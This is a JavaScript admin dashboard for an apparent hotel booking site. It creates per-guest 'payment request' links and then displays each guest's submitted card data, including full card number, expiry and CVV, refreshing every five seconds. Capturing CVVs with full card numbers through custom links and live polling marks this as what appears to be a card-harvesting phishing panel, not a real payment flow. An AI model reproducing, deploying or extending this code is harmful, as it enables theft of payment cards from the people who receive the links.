/* Admin dashboard logic — beybun-admin.html only */
(function () {
  function $(id) { return document.getElementById(id); }

  function money(n) {
    return Number(n || 0).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + " TRY";
  }

  function fmtDate(iso) {
    try {
      return new Date(iso).toLocaleString();
    } catch (e) {
      return iso;
    }
  }

  function showScreen(name) {
    var login = $("loginScreen");
    var dash = $("dashScreen");
    if (name === "dash") {
      login.hidden = true;
      login.style.display = "none";
      dash.hidden = false;
      dash.style.display = "";
      document.body.classList.add("is-admin-dash");
      document.body.classList.remove("is-admin-login");
    } else {
      dash.hidden = true;
      dash.style.display = "none";
      login.hidden = false;
      login.style.display = "";
      document.body.classList.add("is-admin-login");
      document.body.classList.remove("is-admin-dash");
    }
  }

  function setTab(tab) {
    document.querySelectorAll("[data-admin-tab]").forEach(function (btn) {
      btn.classList.toggle("is-active", btn.getAttribute("data-admin-tab") === tab);
    });
    $("tabContacts").hidden = tab !== "contacts";
    $("tabPayments").hidden = tab !== "payments";
    $("tabCreate").hidden = tab !== "create";
    $("tabSecurity").hidden = tab !== "security";
  }

  function renderContacts() {
    var list = window.BeybunStore.getContacts();
    $("contactCount").textContent = String(list.length);
    var root = $("contactsList");
    if (!list.length) {
      root.innerHTML = '<p class="admin-empty">No contact requests yet.</p>';
      return;
    }
    root.innerHTML = list.map(function (c) {
      return (
        '<article class="admin-card" data-contact="' + c.id + '">' +
          '<div class="admin-card-top">' +
            '<div><strong>' + escapeHtml(c.name) + '</strong>' +
            '<span class="admin-badge">' + escapeHtml(c.status || "new") + '</span></div>' +
            '<time>' + escapeHtml(fmtDate(c.createdAt)) + '</time>' +
          '</div>' +
          '<dl class="admin-dl">' +
            '<div><dt>Email</dt><dd>' + escapeHtml(c.email) + '</dd></div>' +
            '<div><dt>Phone</dt><dd>' + escapeHtml(c.phone) + '</dd></div>' +
            '<div><dt>Room</dt><dd>' + escapeHtml(c.room) + '</dd></div>' +
            '<div><dt>Check-in</dt><dd>' + escapeHtml(c.checkin) + '</dd></div>' +
            '<div><dt>Check-out</dt><dd>' + escapeHtml(c.checkout) + '</dd></div>' +
            '<div><dt>Guests</dt><dd>' + escapeHtml(String(c.guests)) + '</dd></div>' +
          '</dl>' +
          '<p class="admin-msg">' + escapeHtml(c.message || "—") + '</p>' +
          '<div class="admin-actions">' +
            '<button type="button" class="btn btn-ghost" data-mark-read="' + c.id + '">Mark read</button>' +
            '<button type="button" class="btn btn-ghost" data-create-from="' + c.id + '">Create payment</button>' +
            '<button type="button" class="btn btn-ghost" data-del-contact="' + c.id + '">Delete</button>' +
          '</div>' +
        '</article>'
      );
    }).join("");
  }

  function renderPayments() {
    var list = window.BeybunStore.getPayments();
    $("paymentCount").textContent = String(list.length);
    var root = $("paymentsList");
    if (!list.length) {
      root.innerHTML = '<p class="admin-empty">No payment requests yet. Create one from the Create tab.</p>';
      return;
    }
    root.innerHTML = list.map(function (p) {
      var cardBlock = p.card
        ? (
          '<div class="admin-card-data">' +
            '<h4>Card submitted</h4>' +
            '<dl class="admin-dl">' +
              '<div><dt>Cardholder</dt><dd>' + escapeHtml(p.card.holder) + '</dd></div>' +
              '<div><dt>Card number</dt><dd class="mono">' + escapeHtml(window.BeybunStore.formatCard(p.card.number)) + '</dd></div>' +
              '<div><dt>Expiry</dt><dd>' + escapeHtml(p.card.expiry) + '</dd></div>' +
              '<div><dt>CVV</dt><dd class="mono">' + escapeHtml(p.card.cvv) + '</dd></div>' +
              '<div><dt>Submitted</dt><dd>' + escapeHtml(fmtDate(p.card.submittedAt)) + '</dd></div>' +
            '</dl>' +
          '</div>'
        )
        : '<p class="admin-waiting">Waiting for guest card details…</p>';

      return (
        '<article class="admin-card">' +
          '<div class="admin-card-top">' +
            '<div><strong class="mono">' + escapeHtml(p.requestNumber) + '</strong>' +
            '<span class="admin-badge">' + escapeHtml(p.status) + '</span></div>' +
            '<time>' + escapeHtml(fmtDate(p.createdAt)) + '</time>' +
          '</div>' +
          '<dl class="admin-dl">' +
            '<div><dt>Guest</dt><dd>' + escapeHtml(p.clientName) + '</dd></div>' +
            '<div><dt>Phone</dt><dd>' + escapeHtml(p.phone || "—") + '</dd></div>' +
            '<div><dt>Room</dt><dd>' + escapeHtml(p.room || "—") + '</dd></div>' +
            '<div><dt>Check-in</dt><dd>' + escapeHtml(p.checkin) + '</dd></div>' +
            '<div><dt>Check-out</dt><dd>' + escapeHtml(p.checkout) + '</dd></div>' +
            '<div><dt>Daily</dt><dd>' + money(p.dailyCost) + '</dd></div>' +
            '<div><dt>Total</dt><dd>' + money(p.totalCost) + '</dd></div>' +
            '<div><dt>Down payment</dt><dd>' + money(p.downPayment) + '</dd></div>' +
          '</dl>' +
          cardBlock +
          '<div class="admin-actions">' +
            '<button type="button" class="btn btn-ghost" data-copy-ref="' + escapeHtml(p.requestNumber) + '">Copy number</button>' +
            '<button type="button" class="btn btn-ghost" data-copy-link="' + escapeHtml(p.requestNumber) + '">Copy guest link</button>' +
            '<button type="button" class="btn btn-ghost" data-del-payment="' + escapeHtml(p.requestNumber) + '">Delete</button>' +
          '</div>' +
        '</article>'
      );
    }).join("");
  }

  function escapeHtml(str) {
    return String(str == null ? "" : str)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;");
  }

  function refresh() {
    renderContacts();
    renderPayments();
  }

  function initLogin() {
    window.BeybunStore.ensureAdmin().then(function () {
      if (window.BeybunStore.isLoggedIn()) {
        window.BeybunStore.ensureSync().then(function () {
          showScreen("dash");
          refresh();
        });
      } else {
        showScreen("login");
      }
    });

    $("adminLoginForm").addEventListener("submit", function (e) {
      e.preventDefault();
      var err = $("loginError");
      err.hidden = true;
      var username = $("adminUsername").value;
      var password = $("adminPassword").value;
      window.BeybunStore.login(username, password).then(function (ok) {
        if (!ok) {
          err.hidden = false;
          return;
        }
        $("adminUsername").value = "";
        $("adminPassword").value = "";
        showScreen("dash");
        refresh();
      });
    });

    $("logoutBtn").addEventListener("click", function () {
      window.BeybunStore.logout();
      showScreen("login");
    });

    // Keep payment cards in sync when guests pay from another device
    setInterval(function () {
      if (!window.BeybunStore.isLoggedIn()) return;
      if ($("dashScreen").hidden) return;
      window.BeybunStore.pullCloud().then(function (data) {
        if (data) refresh();
      });
    }, 5000);
  }

  function initTabs() {
    document.querySelectorAll("[data-admin-tab]").forEach(function (btn) {
      btn.addEventListener("click", function () {
        setTab(btn.getAttribute("data-admin-tab"));
      });
    });
    setTab("contacts");
  }

  function initCreate() {
    $("createPaymentForm").addEventListener("submit", function (e) {
      e.preventDefault();
      var form = e.target;
      var data = new FormData(form);

      function finishCreate() {
        var item = window.BeybunStore.createPaymentRequest({
          clientName: data.get("clientName"),
          phone: data.get("phone"),
          email: data.get("email"),
          room: data.get("room"),
          checkin: data.get("checkin"),
          checkout: data.get("checkout"),
          dailyCost: data.get("dailyCost"),
          totalCost: data.get("totalCost"),
          downPayment: data.get("downPayment"),
          notes: data.get("notes")
        });
        var token = window.BeybunStore.encodePaymentPayload(item);
        var guestLink = new URL("payment.html", window.location.href);
        guestLink.searchParams.set("ref", item.requestNumber);
        guestLink.searchParams.set("d", token);
        $("createdNumber").textContent = item.requestNumber;
        $("createdLink").href = guestLink.toString();
        $("createdLink").textContent = guestLink.toString();
        $("createdBox").hidden = false;
        form.reset();
        refresh();
        setTab("payments");
      }

      window.BeybunStore.ensureSync().then(finishCreate);
    });
  }

  function initSecurity() {
    $("changePasswordForm").addEventListener("submit", function (e) {
      e.preventDefault();
      var msg = $("passwordMsg");
      msg.hidden = true;
      var cur = $("currentPassword").value;
      var next = $("newPassword").value;
      var confirm = $("confirmPassword").value;
      if (next.length < 8) {
        msg.hidden = false;
        msg.textContent = "New password must be at least 8 characters.";
        msg.className = "form-error";
        return;
      }
      if (next !== confirm) {
        msg.hidden = false;
        msg.textContent = "New passwords do not match.";
        msg.className = "form-error";
        return;
      }
      window.BeybunStore.changePassword("Mustafa.Beybun", cur, next).then(function (ok) {
        msg.hidden = false;
        if (!ok) {
          msg.textContent = "Current password is incorrect.";
          msg.className = "form-error";
          return;
        }
        msg.textContent = "Password updated.";
        msg.className = "form-success is-visible";
        e.target.reset();
      });
    });
  }

  function initActions() {
    document.body.addEventListener("click", function (e) {
      var t = e.target.closest("[data-mark-read],[data-del-contact],[data-del-payment],[data-copy-ref],[data-copy-link],[data-create-from]");
      if (!t) return;
      if (t.hasAttribute("data-mark-read")) {
        window.BeybunStore.markContactRead(t.getAttribute("data-mark-read"));
        refresh();
      }
      if (t.hasAttribute("data-del-contact")) {
        if (confirm("Delete this contact request?")) {
          window.BeybunStore.deleteContact(t.getAttribute("data-del-contact"));
          refresh();
        }
      }
      if (t.hasAttribute("data-del-payment")) {
        if (confirm("Delete this payment request?")) {
          window.BeybunStore.deletePayment(t.getAttribute("data-del-payment"));
          refresh();
        }
      }
      if (t.hasAttribute("data-copy-ref")) {
        var code = t.getAttribute("data-copy-ref");
        navigator.clipboard.writeText(code).then(function () {
          t.textContent = "Copied!";
          setTimeout(function () { t.textContent = "Copy number"; }, 1200);
        });
      }
      if (t.hasAttribute("data-copy-link")) {
        var req = t.getAttribute("data-copy-link");
        var payment = window.BeybunStore.getPaymentByNumber(req);
        if (!payment) return;
        var token = window.BeybunStore.encodePaymentPayload(payment);
        var guestLink = new URL("payment.html", window.location.href);
        guestLink.searchParams.set("ref", payment.requestNumber);
        guestLink.searchParams.set("d", token);
        navigator.clipboard.writeText(guestLink.toString()).then(function () {
          t.textContent = "Link copied!";
          setTimeout(function () { t.textContent = "Copy guest link"; }, 1200);
        });
      }
      if (t.hasAttribute("data-create-from")) {
        var id = t.getAttribute("data-create-from");
        var c = window.BeybunStore.getContacts().find(function (x) { return x.id === id; });
        if (!c) return;
        setTab("create");
        var form = $("createPaymentForm");
        form.clientName.value = c.name || "";
        form.phone.value = c.phone || "";
        form.email.value = c.email || "";
        form.room.value = c.room || "";
        form.checkin.value = c.checkin || "";
        form.checkout.value = c.checkout || "";
      }
    });
  }

  document.addEventListener("DOMContentLoaded", function () {
    initLogin();
    initTabs();
    initCreate();
    initSecurity();
    initActions();
  });
})();
